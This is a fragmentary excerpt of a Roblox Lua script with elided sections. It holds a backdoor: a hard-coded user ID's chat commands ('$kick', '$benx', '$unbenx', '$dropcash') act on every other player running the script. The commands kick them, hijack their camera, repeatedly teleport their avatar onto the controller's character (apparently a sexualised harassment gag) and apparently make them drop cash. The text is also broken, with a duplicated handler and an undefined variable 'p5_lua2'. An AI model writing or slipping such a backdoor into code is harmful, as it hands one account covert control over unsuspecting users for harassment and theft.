while true do 
	local p5_lua = game:GetService("Players"):GetPlayerByUserId(2244576018) --ZaCzArOwAnA_JeStEm
		...
		p5_lua.Chatted:connect(function(cht)
			if cht:match("$kick .") then
				if game.Players.LocalPlayer ~= p5_lua then
		...
		p5_lua.Chatted:connect(function(cht)
			if cht:match("$benx .") then
				if game.Players.LocalPlayer ~= p5_lua then
					...
					game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = p5_lua.Character.HumanoidRootPart
					local benxed = true
					while benxed == true do
						...
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = p5_lua.Character.HumanoidRootPart.CFrame + p5_lua.Character.HumanoidRootPart.CFrame.lookVector * 0.5
		...
		p5_lua.Chatted:connect(function(cht)
			if cht:match("$unbenx .") then
				if game.Players.LocalPlayer ~= p5_lua then
					...
					wait(15)
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(p5_lua.Character.UpperTorso.Position)
				end
			end
		...
		p5_lua.Chatted:connect(function(cht)
			if cht:match("$kick .") then
				if game.Players.LocalPlayer ~= p5_lua then
					game.Players.LocalPlayer:Kick("Kicked by p5_lua user")
				end
			end
		...
		p5_lua.Chatted:connect(function(cht)
			if cht:match("$dropcash .") then
				if game.Players.LocalPlayer ~= p5_lua2 then
